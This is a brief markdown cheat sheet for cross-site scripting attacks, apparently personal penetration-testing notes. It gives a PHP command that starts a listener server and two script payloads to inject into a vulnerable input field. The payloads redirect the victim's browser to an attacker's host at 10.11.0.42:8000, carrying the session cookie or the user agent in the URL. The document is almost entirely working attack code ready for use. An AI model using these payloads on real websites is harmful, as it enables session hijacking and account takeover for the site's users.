## XSS attacks

### run below command first
```
php -S <lcoal_ip>:8000
```

### place below code in vulnerable input
```
<script>window.location='http://10.11.0.42:8000/?cookie='+document.cookie</script>
<script>window.location='http://10.11.0.42:8000/?cookie='+navigator.userAgent</script>
```
